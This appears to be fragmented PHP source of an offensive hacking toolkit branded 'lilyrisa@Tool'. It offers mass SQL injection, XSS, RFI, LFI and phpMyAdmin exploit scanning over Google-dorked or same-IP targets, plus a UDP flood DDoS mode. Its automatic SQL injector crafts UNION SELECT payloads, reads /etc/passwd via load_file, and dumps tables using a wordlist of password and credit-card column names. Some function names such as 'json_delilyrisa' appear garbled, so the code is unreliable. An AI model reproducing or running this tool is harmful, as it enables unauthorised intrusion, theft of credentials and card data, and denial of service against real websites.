...
function Ddos(){
    ...
    fwrite(STDOUT, "-Number of Packet: ");
    $packet = trim(fgets(STDIN));
    fwrite(STDOUT, "-Bytes: ");
    $byte = trim(fgets(STDIN));
    fwrite(STDOUT, "-Output (optional): ");
...
$text .= "\n\e[1;49;27m|*****************************|\n";
$text .= "|        \e[1;49;149mlilyrisa@Tool        |\e[1;49;27m\n";
$text .= "|*****************************|\e[0;49;37m\n";
$text .= "\n\n";
print $text;
}
...
$text .= "[\e[1;49;92msql\e[0;49;37m] --------> Scan SQL Injection vulnerable\n";
$text .= "[\e[1;49;92mxss\e[0;49;37m] --------> Scan XSS(cross site scripting) vulnerable\n";
$text .= "[\e[1;49;92mrfi\e[0;49;37m] --------> Scan RFI(remote file include) vulnerable\n";
$text .= "[\e[1;49;92mlfi\e[0;49;37m] --------> Scan LFI(local file include) vulnerable\n";
$text .= "[\e[1;49;92mpmapwn\e[0;49;37m] -----> Scan phpMyAdmin lilyrisa injection vulnerable\n";
$text .= "[\e[1;49;92mfull\e[0;49;37m] -------> Grab link from website and start all scan\n";
$text .= "[\e[1;49;92mgoogle\e[0;49;37m] -----> Grab website from google and start all scan\n";
$text .= "[\e[1;49;92mgetlist\e[0;49;37m] ----> Grab website from file and start all scan\n";
$text .= "[\e[1;49;92mjump\e[0;49;37m] -------> Find all site hosted on same ip and start all scan\n";
$text .= "[\e[1;49;92mexploit\e[0;49;37m] ----> Exploit-DB Exploit Finder\n";
$text .= "[\e[1;49;92minjector\e[0;49;37m] ---> Automatic SQL Injector, work for v4 and v5\n";
$text .= "[\e[1;49;92mhexstring\e[0;49;37m] --> Convert string to hex (useful for sql injection)\n";
$text .= "[\e[1;49;92mmd5string\e[0;49;37m] --> Convert string to MD5 Hash\n";
$text .= "[\e[1;49;92mhash\e[0;49;37m] --> hashing algorithm\n";
$text .= "[\e[1;49;92mportscan\e[0;49;37m] --> Check port open and close\n";
$text .= "[\e[1;49;92mwget\e[0;49;37m] -------> Get file from URL\n";
$text .= "[\e[1;49;92mDDOS\e[0;49;37m] -------> DDoS UDP flood\n\n";
print $text;
}
...
function jump() {
	print "Example: https://www.google.com/\n";  
        ...
        foreach($links[1] as $link) {
            $link = "http://".$link;
            $save = @file_put_contents('log/domain_list.txt',"$link\n",FILE_APPEND);
        }
...
function google() { // AIzaSyAvfQptg1KAvk
  fwrite(STDOUT, "-DORK: ");
  ...
  for($i = 0;$i < 10;$i++) {
    ...
    $json = json_delilyrisa($body);

    for($x = 0;$x < count($json->responseData->results);$x++) {
      $real = urldelilyrisa($json->responseData->results[$x]->url);
      echo "\n->".$real;
      $save = file_put_contents('log/domain_list.txt', "$real\n",FILE_APPEND);
      $total++;
    }
  }
  print "[-] Domain list saved to 'domain_list.txt'\n";
  print "[+] Total site found: $total\n";
  $domain = file('log/domain_list.txt');
        ...
        if(con_host($url))
        {
            ...
            if(is_array($save)) {
               ...
               foreach($save as $link) {
                $save = @file_put_contents('log/vulnerable.log', "".$link."\r\n",FILE_APPEND);
                    echo "-> \e[1;31;4m".$link."\n";
               }}
...
function exploit() {
  ...
  foreach($dom->getElementsByTagName('td') as $table)
  {
    if($table->getAttribute('class') == 'list_explot_date')
    {
      ...
      $save = file_put_contents('log/exploits.log', "[+]Exploit Date : $date \r\n",FILE_APPEND);
    }
	...
	$save = file_put_contents('log/exploits.log', "[+]Exploit URL  = ".$dlink."\r\n",FILE_APPEND);
      }
    }
	...
	$save = file_put_contents('log/exploits.log', "[+]Exploit Name = ".$desc."\r\n",FILE_APPEND);
	$save = file_put_contents('log/exploits.log', "------------------------- \r\n",FILE_APPEND);
      }
    }
  }
...
'/mysql-admin/',
        ...
        print "\n[!] pmaPWN! - phpMyAdmin lilyrisa Injection Exploit(PHP)\n\n";
        print "[-] Site : ".$site."\n";
...
function phpmyadmin_exploit($w00t) {
        ...
        $save = @file_put_contents('log/pmashell.txt', $w00t."config/config.inc.php?c=id\r\n",FILE_APPEND);
        }
        else {
            print "\n[!] Shit! no luck.. not vulnerable\n";
            return false;
...
function injector() {
        ...
        print "[-] Example: http://site.com/news.php?id=\n";
        fwrite(STDOUT, "\n-URL: ");
        $url = trim(fgets(STDIN));
        $url .= 'lilyrisa';
        fwrite(STDOUT, "\n-URL Ending (-- or /*): ");
        $end = trim(fgets(STDIN));
        if(!preg_match("/lilyrisa/", $url)) {
...
function inject_get_column_num($url, $ending) {
    ...
    for($i = 0; $i <= $max; $i++) {
    $word .= "concat(0x6C696C7972697361,0x3a,".str_repeat($i,1).",0x3a),";
    $sql = str_replace("lilyrisa", "1+AND+1=2+UNION+ALL+SELECT+".rtrim($word,",")."+$ending", $url);
    if(preg_match("/lilyrisa:(.*?):/i", con_host($sql), $val)) {
        print "[-] Found column number: ".$i."\n";
        print "[-] Null Number: ".$val[1]."\n";
        $save = @file_put_contents('log/injector.txt', "[-] Found column number: ".$i."\r\n",FILE_APPEND);
        $save = @file_put_contents('log/injector.txt', "[-] Null Number: ".$val[1]."\r\n",FILE_APPEND);
        
        for($a = 0; $a <= $i; $a++) {
        $col .= "$a,";
         if($a == $val[1]) {
             $col = str_replace($val[1], "lilyrisa", $col);
         }
        }
        $real = str_replace("lilyrisa", "1+AND+1=2+UNION+ALL+SELECT+".rtrim($col,",")."+$ending", $rurl);
        print "[-] URL: ".$real."\n";
        $save = @file_put_contents('log/injector.txt', "[-] URL: ".$real."\r\n",FILE_APPEND);
        sql_info($real);
   }
  }
}
...
'user','username','password','passwd','pass','cc_number','id','email','emri','fjalekalimi','pwd','user_name','customers_email_address','customers_password','user_password','name','user_pass','admin_user','admin_password','admin_pass','usern','user_n','users','login','logins','login_user','login_admin','login_username','user_username','user_login','auid','apwd','adminid','admin_id','adminuser','adminuserid','admin_userid','adminusername','admin_username','adminname','admin_name','usr','usr_n','usrname','usr_name','usrpass','usr_pass','usrnam','nc','uid','userid','user_id','myusername','mail','emni','logohu','punonjes','kpro_user','wp_users','emniplote','perdoruesi','perdorimi','punetoret','logini','llogaria','fjalekalimin','kodi','emer','ime','korisnik','korisnici','user1','administrator','administrator_name','mem_login','login_password','login_pass','login_passwd','login_pwd','sifra','lozinka','psw','pass1word','pass_word','passw','pass_w','user_passwd','userpass','userpassword','userpwd','user_pwd','useradmin','user_admin','mypassword','passwrd','admin_pwd','admin_passwd','mem_password','memlogin','e_mail','usrn','u_name','uname','mempassword','mem_pass','mem_passwd','mem_pwd','p_word','pword','p_assword','myname','my_username','my_name','my_password','my_email','cvvnumber','about','access','accnt','accnts','account','accounts','admin','adminemail','adminlogin','adminmail','admins','aid','aim','auth','authenticate','authentication','blog','cc_expires','cc_owner','cc_type','cfg','cid','clientname','clientpassword','clientusername','conf','config','contact','converge_pass_hash','converge_pass_salt','crack','customer','customers','cvvnumber]','data','db_database_name','db_hostname','db_password','db_username','download','e-mail','emailaddress','full','gid','group','group_name','hash','hashsalt','homepage','icq','icq_number','id_group','id_member','images','index','ip_address','last_ip','last_login','lastname','log','login_name','login_pw','loginkey','loginout','logo','md5hash','member','member_id','member_login_key','member_name','memberid','membername','members','new','news','nick','number','nummer','pass_hash','passwordsalt','passwort','personal_key','phone','privacy','pw','pwrd','salt','search','secretanswer','secretquestion','serial','session_member_id','session_member_login_key','sesskey','setting','sid','spacer','status','store','store1','store2','store3','store4','table_prefix','temp_pass','temp_password','temppass','temppasword','text','un','user_email','user_icq','user_ip','user_level','user_passw','user_pw','user_pword','user_pwrd','user_un','user_uname','user_usernm','user_usernun','user_usrnm','userip','userlogin','usernm','userpw','usr2','usrnm','usrs','warez','xar_name','xar_pass'
    ...
    foreach($info as $get => $val) {
        if(preg_match("/lilyrisa:(.*?):lilyrisa/", con_host("".str_replace("lilyrisa", "".$string."+concat(0x6C696C7972697361,0x3a,$val,0x3a,0x6C696C7972697361)+", $url).""), $value)) {
            print "[-] $get: $value[1]\n";
            $save = @file_put_contents('log/injector.txt', "[-] $get: $value[1]\r\n",FILE_APPEND);
        }}
        print "[-] Testing load file...\n";
    $load = str_replace("lilyrisa", "".$string."load_file(0x2f6574632f706173737764)", $rurl);
    if(preg_match("/root:x:/", con_host($load))) {
        print "[-] w00t w00t, you have permission to load file!\n";
        print "[-] URL: $load\n";
        $save = @file_put_contents('log/injector.txt', "[-] w00t w00t, you have permission to load file!\r\n",FILE_APPEND);
        $save = @file_put_contents('log/injector.txt', "[-] URL: $load\r\n",FILE_APPEND);
    } else {
        print "[-] No permission to load file :( \n";
    }
            if(preg_match("/lilyrisa:5.(.*?):lilyrisa/", con_host("".str_replace("lilyrisa", "concat(0x6C696C7972697361,0x3a,version(),0x3a,0x6C696C7972697361)", $url).""), $value)) {
                print "[-] MySQL Server version is : 5.x\n";
                print "[-] Start extract the column and table...\n";
                print "[-] Table : Column\n";
                $url = str_replace("lilyrisa", "group_concat(char(114,48,120,58),table_name,char(58,114,48,120))", $url);
                ...
                if(preg_match_all("/r0x:(.*?):r0x/", con_host($url), $tables)) {
                    ...
                    $i++;
                    $url = str_replace("lilyrisa", "group_concat(char(114,48,120,58),column_name,char(58,114,48,120))", $rurl);
                    ...
                    if(preg_match_all("/r0x:(.*?):r0x/", con_host($url), $columns)) {
                        print "[$i] ($table) : ";
                        $save = @file_put_contents('log/injector.txt', "[$i] ($table) : ",FILE_APPEND);
                        foreach($columns[1] as $column) {
                            print "$column, ";
                            $save = @file_put_contents('log/injector.txt', "$column, ",FILE_APPEND);
                        }
                        $save = @file_put_contents('log/injector.txt', "\r\n",FILE_APPEND);
                        print "\n\n";
                    }
                    }
                }
                ...
                foreach($table_4 as $table) {
                    $i++;
                    $url = str_replace("concat(0x696E6A336374)", "concat(0x6C696C7972697361)", $rurl);
                    $url = str_replace($ending, "+from+".$table."+$ending", $url);
                    if(preg_match("/lilyrisa/", con_host($url))) {
                        print "[$i] Found Table : $table\n";
                        save_log('injector.txt', "[-] Found Table : $table\r\n");
                        print "[-] Finding column...\n";
                         foreach($column_4 as $column) {
                             $url = str_replace("lilyrisa", "concat(0x6C696C7972697361,0x3a,$column,0x3a,0x6C696C7972697361)", $rurl);
                            $url = str_replace("$ending", "+from+".$table."+$ending", $url);
                            if(preg_match("/lilyrisa:(.*?):lilyrisa/", con_host($url))) {
                                print "[-] Found column: $column\n";
                                $save = @file_put_contents('log/injector.txt', "[-] Found column: $column\r\n",FILE_APPEND);
                            }
                         }
                         $save = @file_put_contents('log/injector.txt', "\r\n",FILE_APPEND);
